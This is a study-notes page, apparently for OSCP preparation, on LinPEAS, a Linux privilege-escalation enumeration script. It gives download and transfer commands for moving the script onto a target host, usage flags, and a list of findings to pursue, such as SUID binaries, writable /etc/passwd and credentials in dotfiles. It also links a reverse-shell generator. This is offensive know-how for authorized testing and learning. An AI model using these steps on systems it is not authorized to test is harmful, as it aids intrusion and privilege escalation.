# LinPEAS

Part of [[MODERN TOOLING]]. Linux Privilege Escalation Awesome Script -- the go-to automated enumeration tool for Linux privesc. Full context: [[18. Linux Privilege Escalation#18.1.3 Automated Enumeration|Module 18.1.3]].

---

## What it does

Runs a comprehensive automated sweep of a Linux system and colour-codes findings by severity. Red/yellow = high confidence, worth investigating immediately. Covers: SUID binaries, capabilities, sudo misconfigs, cron jobs, writable paths, kernel version, installed software CVEs, credential files, SSH keys, environment variables, and more.

---

## Install / Transfer

LinPEAS is not pre-installed by default. Download the latest release on Kali, then transfer to the target.

```bash
# Download latest release to Kali
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/linpeas.sh
chmod +x /opt/linpeas.sh

# Transfer to target
scp /opt/linpeas.sh user@<TARGET>:/tmp/linpeas.sh
# or via Python HTTP server:
cd /opt && python3 -m http.server 80
# on target: curl http://<KALI_IP>/linpeas.sh -o /tmp/linpeas.sh
```

---

## Basic Usage

```bash
# Run with all checks (most common)
chmod +x /tmp/linpeas.sh
./linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Run with colour (default) -- pipe through less -R to keep colour in the pager
./linpeas.sh 2>/dev/null | less -R

# Run quietly (no colour, useful if terminal doesn't support ANSI)
./linpeas.sh -q 2>/dev/null

# Run only specific sections (faster, fewer false positives)
./linpeas.sh -a   # all checks
./linpeas.sh -s   # super fast, critical checks only
```

---

## Reading the output

| Colour | Meaning |
|---|---|
| Red/yellow bold | High-confidence finding, investigate immediately |
| Yellow | Medium confidence, worth checking |
| Green | Informational, low priority |
| Default | Background output, usually safe to skip |

**Where to focus first:**
1. Any `SUID` binary that is not in the standard list
2. `cap_setuid+ep` in capabilities output
3. World-writable `/etc/passwd` or `/etc/sudoers`
4. Cron jobs calling writable scripts
5. sudo -l entries with GTFOBins entries
6. Old kernel version flagged as vulnerable
7. Credentials in env/dotfiles/config files

---

## Comparison with other tools

| Tool | Strengths | When to prefer |
|---|---|---|
| LinPEAS | Most comprehensive, actively maintained, colour-coded output | Default choice for detailed sweep |
| unix-privesc-check | Simpler, pre-installed on Kali, low noise, good for quick WARNING scan | Fast initial check, especially for /etc/passwd and sudoers |
| LinEnum | Older, less maintained | Fallback if LinPEAS won't run |

---

## Notes

- Run manual enumeration first (id, sudo -l, env, SUID search) before LinPEAS. Tools augment, not replace, manual work. Context-dependent misconfigs (like a writable script called indirectly by cron) need human analysis to spot.
- LinPEAS generates a lot of output. Always `tee` to a file so you can grep it later.
- On containers (Docker), many paths may be missing or restricted. The tool still runs but some checks will fail silently.

#### Tags: #LinPEAS #LinuxPrivesc #AutomatedEnumeration #ModernTooling #Module18
## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

LinPEAS supports a repeatable task in an authorized assessment; knowing when to use it keeps the workflow deliberate rather than tool-led.

## Tool description

LinPEAS is a focused utility for the technique named by this page. Read its output as evidence and confirm important findings manually.

## Related RUNBOOK V2 stage

- [[RUNBOOK V2/Index]] -- route to the technique-specific stage after identifying the finding

## Related module

- [[MODULES/13. Locating Public Exploits]] -- understand the tool’s place in a controlled workflow
